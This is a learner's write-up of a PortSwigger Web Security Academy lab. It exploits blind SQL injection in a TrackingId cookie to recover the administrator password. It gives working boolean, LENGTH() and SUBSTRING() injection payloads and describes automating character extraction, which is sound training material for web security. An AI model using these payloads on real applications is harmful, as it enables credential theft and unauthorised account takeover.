# Lab 5 — Blind SQL Injection with Conditional Responses

## Overview

**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Type:** Blind SQL Injection — Conditional Responses
**Difficulty:** Practitioner

### Objective

Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to determine the password of the `administrator` user and use it to authenticate to the application.

---

## Vulnerability

The application uses the `TrackingId` cookie for analytics and incorporates its value into a SQL query.

The SQL query results are not directly displayed, and the application does not return database errors.

However, the application behaves differently depending on whether the SQL query returns a result:

* **True condition:** the page displays `Welcome back`
* **False condition:** the `Welcome back` message disappears

This creates a **blind SQL injection vulnerability based on conditional responses**.

---

## 1. Identifying the injection point

The original request contained:

```http
Cookie: TrackingId=oBG3NJYKvRAYb9NQ
```

I modified the cookie to introduce a boolean condition:

```text
oBG3NJYKvRAYb9NQ' AND '1'='1
```

The response contained:

```text
Welcome back
```

I then changed the condition to a false expression:

```text
oBG3NJYKvRAYb9NQ' AND '1'='2
```

The `Welcome back` message disappeared.

This confirmed that the application response could be used as a boolean oracle.

---

## 2. Confirming the `users` table

The next step was to determine whether a `users` table existed.

Payload:

```text
oBG3NJYKvRAYb9NQ' AND (SELECT 'x' FROM users LIMIT 1)='x
```

The application returned:

```text
Welcome back
```

This confirmed that the subquery successfully returned a row from the `users` table.

---

## 3. Identifying the administrator account

I then verified whether the `administrator` user existed:

```text
oBG3NJYKvRAYb9NQ' AND (SELECT username FROM users LIMIT 1)='administrator
```

The response again contained:

```text
Welcome back
```

This confirmed that the first returned username was `administrator`.

---

## 4. Determining the password length

The password itself was not directly returned by the application.

Instead, I used the `LENGTH()` function to test its size.

For example:

```text
oBG3NJYKvRAYb9NQ' AND LENGTH((SELECT password FROM users LIMIT 1))=10--
```

This did not produce `Welcome back`.

I continued testing different lengths.

Eventually:

```text
oBG3NJYKvRAYb9NQ' AND LENGTH((SELECT password FROM users LIMIT 1))=20--
```

returned:

```text
Welcome back
```

Therefore:

**Password length = 20 characters**

---

## 5. Automating the character extraction

Testing every character manually would require a large number of requests.

I automated the process using Python.

The script tested each character position using `SUBSTRING()` and used the presence of `Welcome back` as the success condition.

Conceptually, the SQL condition was:

```sql
SUBSTRING(
    (SELECT password FROM users LIMIT 1),
    position,
    1
) = 'character'
```

For each position, the script tested the possible lowercase letters and numbers until the correct character produced the `Welcome back` response.

This allowed the complete password to be recovered without manually testing every character.

---

## 6. Authentication

After recovering the 20-character password, I used it to log in through the application's login page as:

```text
administrator
```

The lab was successfully completed.

---

## Key Takeaways

### Blind SQL Injection

Blind SQL injection occurs when SQL injection is possible but the application does not directly return the query results.

In this case, the application leaked information indirectly through the presence or absence of:

```text
Welcome back
```

### Boolean Oracle

The application's different responses created a **boolean oracle**.

For example:

```sql
' AND '1'='1
```

produced a positive response, while:

```sql
' AND '1'='2
```

produced a negative response.

This allowed database information to be extracted one condition at a time.

### Data Extraction

Once a reliable boolean oracle was identified, functions such as:

```sql
LENGTH()
```

and:

```sql
SUBSTRING()
```

could be used to infer the contents of database fields.

---

## Methodology

```text
Identify injection point
        ↓
Test TRUE condition
        ↓
Test FALSE condition
        ↓
Confirm boolean oracle
        ↓
Identify users table
        ↓
Identify administrator user
        ↓
Determine password length
        ↓
Extract characters automatically
        ↓
Authenticate as administrator
```

---

## Tools

* Burp Suite
* Burp Repeater
* Python
* PortSwigger Web Security Academy

---

## Conclusion

This lab demonstrated how a seemingly small difference in application behavior can turn into a powerful information disclosure mechanism.

Even though the database results were never displayed directly, the `Welcome back` response allowed SQL conditions to be evaluated remotely.

The key technique was converting the blind SQL injection into a series of **true/false questions**, then automating those questions to recover the administrator password.

**Lab status: Solved ✅**
